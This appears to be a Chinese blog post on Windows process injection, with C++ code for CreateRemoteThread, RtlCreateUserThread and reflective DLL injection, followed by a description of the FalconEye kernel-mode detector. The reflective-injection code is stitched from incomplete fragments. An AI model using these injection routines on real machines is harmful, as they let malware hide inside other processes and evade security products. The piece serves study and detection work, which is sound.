@@ -1,0 +1,275 @@
+<ul>
+	<li><span style="font-size:22px">进程注入原理</span></li>
+</ul>
+
+<ol>
+	<li>
+	<p><span style="font-size:16px">Windows平台下的进程注入技术一直以来都是一个被人深入研究的话题,并且目前已经拥有许多技术去将数据从一个进程注入到其他进程当中.恶意代码是最常用这种技术去进行敏感操作,以达到隐藏自身,绕过安全产品检测的目的.为了能够全面了解这项技术,曾经在某大会上所讨论的一个主题,该主题包含了尽可能所有的已知并且在当前环境(Win10)下可用的注入技术,并进行了总结.由于内容较多,本主题拆解部分进行分享.&nbsp;这篇主要是阐述在学习过程中所需要的知识铺垫和一些观点的解释,以及一些传统的经典注入方式.</span></p>
+	</li>
+</ol>
+
+<ul>
+	<li><span style="font-size:22px">CreateRemoteThread类型注入</span></li>
+</ul>
+
+<ol>
+	<li>
+	<pre>
+<code class="language-cpp">    DWORD dwSize = (lstrlenW(pszLibFile) + 1) * sizeof(wchar_t);
+ 
+    // 获取传递进程ID的进程句柄
+    HANDLE hProcess = OpenProcess(
+        PROCESS_QUERY_INFORMATION |
+        PROCESS_CREATE_THREAD |
+        PROCESS_VM_OPERATION |
+        PROCESS_VM_WRITE,//目标进程的四个权限
+        FALSE, dwProcessId);
+ 
+    // 在远程进程中为路径名分配空间
+    LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+ 
+ 
+    // 将DLL的路径名复制到远程进程地址空间
+    //pszLibFile：要注入的dll的路径  pathname
+    DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
+ 
+    //在Kernel32.dll中获取LoadLibraryW的实际地址
+    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
+ 
+ 
+    //创建一个调用LoadLibraryW（DLLPathname）的远程线程
+    // CreateRemoteThread(目标进程句柄，NULL，0，线程函数指针，线程函数参数，0，NULL)
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
+ 
+ 
+    // 等待远程线程终止
+    WaitForSingleObject(hThread, INFINITE);
+ 
+    // 释放包含DLL路径名的远程内存并关闭句柄
+    if (pszLibFileRemote != NULL) //开辟的内存已经注入进数据
+        VirtualFreeEx(hProcess, pszLibFileRemote, 0, MEM_RELEASE);
+    //关闭线程和进程函数句柄
+    if (hThread != NULL)
+        CloseHandle(hThread);
+ 
+    if (hProcess != NULL)
+        CloseHandle(hProcess);
+ 
+    return(0);
+}</code></pre>
+
+	<p>&nbsp;</p>
+	</li>
+</ol>
+
+<ul>
+	<li>
+	<h2><span style="font-size:22px">RtlCreateUserThread类型注入</span></h2>
+	</li>
+</ul>
+
+<ol>
+	<li><span style="font-size:22px">&nbsp;</span>
+
+	<pre>
+<code class="language-cpp">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+ 
+ 
+    LPVOID LoadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
+ 
+ 
+    RtlCreateUserThread = (pRtlCreateUserThread)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlCreateUserThread");
+ 
+ 
+#ifdef _DEBUG
+    wprintf(TEXT("[+] Found at 0x%08x\n"), (UINT)RtlCreateUserThread);
+    wprintf(TEXT("[+] Found at 0x%08x\n"), (UINT)LoadLibraryAddress);
+#endif
+ 
+    DWORD dwSize = (wcslen(pszLibFile) + 1) * sizeof(wchar_t);
+ 
+    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+ 
+ 
+    BOOL bStatus = WriteProcessMemory(hProcess, lpBaseAddress, pszLibFile, dwSize, NULL);
+ 
+ 
+    bStatus = (BOOL)RtlCreateUserThread(
+        hProcess,
+        NULL,
+        0,
+        0,
+        0,
+        0,
+        LoadLibraryAddress,
+        lpBaseAddress,
+        &amp;hRemoteThread,
+        NULL);
+    if (bStatus &lt; 0)
+    {
+        wprintf(TEXT("[-] Error: RtlCreateUserThread failed\n"));
+        return(1);
+    }
+    else
+    {
+        wprintf(TEXT("[+] Remote thread has been created successfully ...\n"));
+        WaitForSingleObject(hRemoteThread, INFINITE);
+ 
+        CloseHandle(hProcess);
+        VirtualFreeEx(hProcess, lpBaseAddress, dwSize, MEM_RELEASE);
+        return(0);
+    }
+ 
+    return(0);
+}</code></pre>
+
+	<p>&nbsp;</p>
+	</li>
+</ol>
+
+<ul>
+	<li><span style="font-size:22px">反射式dll注入</span></li>
+</ul>
+
+<p>&nbsp;</p>
+
+<pre>
+<code>extern "C" HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter);
+ 
+DWORD demoReflectiveDllInjection(PCWSTR cpDllFile, DWORD dwProcessId)
+{
+    HANDLE hFile = NULL;//创建的dll文件句柄
+    HANDLE hModule = NULL;//开辟的堆空间句柄
+    HANDLE hProcess = NULL;//目标进程句柄
+    LPVOID lpBuffer = NULL;
+    DWORD dwLength = 0;
+    DWORD dwBytesRead = 0;
+ 
+    do
+    {
+        hFile = CreateFileW(cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+ 
+ 
+        dwLength = GetFileSize(hFile, NULL);
+ 
+ 
+#ifdef _DEBUG
+        wprintf(TEXT("[+] File Size: %d\n"), dwLength);
+#endif
+        //为dll文件开辟堆空间 ！！！！！！！！这是在自己的进程内存中  分配堆内存
+        lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);
+ 
+        //将dll文件读进开辟的堆空间中 hfile--》lpbuffer
+        if (ReadFile(hFile, lpBuffer, dwLength, &amp;dwBytesRead, NULL) == FALSE) BREAK_WITH_ERROR("[-] Failed to alloc a buffer!");
+        //获得目标进程的句柄
+        hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
+ 
+        // LoadRemoteLibraryR：在dll模块加载到内存时获取入口点,并且实现调用该函数（采用rtlcreateuserthread的方式）远程线程注入
+ 
+ 
+ 
+ 
+        hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
+ 
+ 
+        WaitForSingleObject(hModule, -1);
+ 
+    } while (0);
+ 
+    //注入完毕，释放堆空间，关闭进程句柄
+    if (lpBuffer) HeapFree(GetProcessHeap(), 0, lpBuffer);
+ 
+    if (hProcess) CloseHandle(hProcess);
+ 
+    return 0;
+}
+
+
+
+
+            //检查库是否有ReflectiveLoader
+ 
+            // 获得dll文件的入口点偏移
+            dwReflectiveLoaderOffset = GetReflectiveLoaderOffset(lpBuffer);//lpbuffer:堆内存的指针 指向存有dll文件的堆内存空间
+ 
+ 
+            // alloc memory (RWX) in the host process for the image...
+            //为映像分配内存
+            lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, dwLength, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+ 
+ 
+            // write the image into the host process...
+            //将映像写入目标进程
+ 
+ 
+            /*
+            BOOL WriteProcessMemory(
+            HANDLE hProcess,
+                LPVOID lpBaseAddress, 要写的内存首地址
+                LPVOID lpBuffer, 指向要写的数据的指针
+                DWORD nSize,
+                LPDWORD lpNumberOfBytesWritten
+                );
+                */
+ 
+                //将映像写入目标进程  lpRemoteLibraryBuffer  在目标进程中分配的内存空间 lpBuffer在该进程内存空间中分配的堆内存
+ 
+ 
+            // add the offset to ReflectiveLoader() to the remote library address...
+            //lpRemoteLibraryBuffer 分配的内存地址 +dwReflectiveLoaderOffset  入口点偏移
+ 
+            lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + dwReflectiveLoaderOffset);
+ 
+            // create a remote thread in the host process to call the ReflectiveLoader!
+            //OutputDebugString("INJECTING DLL!");
+ 
+            //本身反射性dll 就隐蔽性高，自然不可以用createremoteprocess
+ 
+            RtlCreateUserThread = (PRTL_CREATE_USER_THREAD)(GetProcAddress(GetModuleHandle(TEXT("ntdll")), "RtlCreateUserThread"));
+            RtlCreateUserThread(hProcess, NULL, 0, 0, 0, 0, lpReflectiveLoader, lpParameter, &amp;hThread, NULL); //lpReflectiveLoader 线程函数地址，dll入口函数地址 lpParameter 参数
+ 
+ 
+            WaitForSingleObject(hThread, INFINITE);
+ 
+            //释放掉为dll映像分配的内存
+            VirtualFreeEx(hProcess, lpRemoteLibraryBuffer, dwLength, MEM_RELEASE);
+ 
+        } while (0);
+ 
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+ 
+        hThread = NULL;
+    }
+ 
+    return hThread;
+}</code></pre>
+
+<ul>
+	<li><span style="font-size:16px">用FalconEye实时检测Windows进程注入行为</span></li>
+</ul>
+
+<ol>
+	<li><span style="font-size:16px">FalconEye是一款功能强大的Windows终端安全检测工具，可以帮助广大研究人员实时检测Windows进程注入行为。FalconEye也是一个内核模式驱动工具，旨在实现实时的进程注入行为。由于FalconEye需要以内核模式运行，它可以提供一个强大可靠的安全防御机制来抵御那些尝试绕过各种用户模式钩子的进程注入技术。</span></li>
+	<li>
+	<p><span style="font-size:16px">FalconEye驱动器是一种按需加载的驱动程序；</span></p>
+
+	<p><span style="font-size:16px">初始化包括通过libinfinityhook设置回调和syscall钩子；</span></p>
+
+	<p><span style="font-size:16px">回调维护从跨流程活动（如OpenProcess）构建的Pids的映射，但不限于OpenProcess；</span></p>
+
+	<p><span style="font-size:16px">随后的回调和syscall钩子使用这个Pid映射来减少处理中的噪声；</span></p>
+
+	<p><span style="font-size:16px">作为降噪的一部分，syscall钩子可以过滤掉相同的进程活动；</span></p>
+
+	<p><span style="font-size:16px">检测逻辑分为多种子类，即无状态（例如：Atombombing）、有状态（Unmap+Overwrite）和浮动代码（多种技术实现的Shellcode）；</span></p>
+
+	<p><span style="font-size:16px">针对有状态的检测，syscall钩子会记录一个ActionHistory（历史活动），比如说，它会记录所有的NtWriteVirtualMemory调用；</span></p>
+
+	<p><span style="font-size:16px">检测逻辑具有常见的异常检测功能，如浮动代码检测和远程进程中Shellcode触发器的检测。回调和syscall钩子都会调用这个公共功能来进行实际检测；</span></p>
+	</li>
+	<li>
+	<p><span style="font-size:16px">项目来源https://www.freebuf.com/articles/system/281129.html</span></p>
+	</li>
+</ol>
